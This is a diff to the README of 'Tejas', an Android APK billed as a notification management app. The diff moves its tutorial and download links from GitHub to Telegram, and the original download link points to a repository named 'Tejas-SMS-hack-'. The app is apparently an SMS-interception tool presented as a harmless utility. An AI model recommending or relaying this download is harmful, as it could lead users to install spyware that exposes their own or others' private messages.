@@ -25,11 +25,9 @@ Tejas is a powerful notification management app developed by SG Modder. It enabl
   Get instant notifications as they happen, ensuring real-time awareness.
 
 ## 📹 How to Use
-Check out the tutorial video for a step-by-step guide on how to use Tejas:
+Check out the [tutorial video](https://t.me/SG_Modder1/339) for a step-by-step guide on using Tejas.
 
-[![Watch the video](https://img.youtube.com/vi/TUTORIAL_VIDEO_ID/maxresdefault.jpg)](Tutorial/How%20to%20use%20Tejas%20apk.mp4 "Tejas Tutorial - Click to Play")
-
-*Click the image above to play the video.*
+*Click the link above to watch the video on Telegram.*
 
 ---
 
@@ -41,7 +39,7 @@ To set up Tejas with your bot, you'll need:
 ---
 
 ## 📥 Download
-[![Download Tejas APK](https://img.shields.io/badge/Download-Tejas--APK-red?style=for-the-badge&logo=android)](https://github.com/SGModder-Offcial/Tejas-SMS-hack-/raw/50dbf554c4a0b35937324affd71d2b21366f667b/Tejas.apk)
+[![Download Tejas APK](https://t.me/SG_Modder1/336)
 
 ---
 
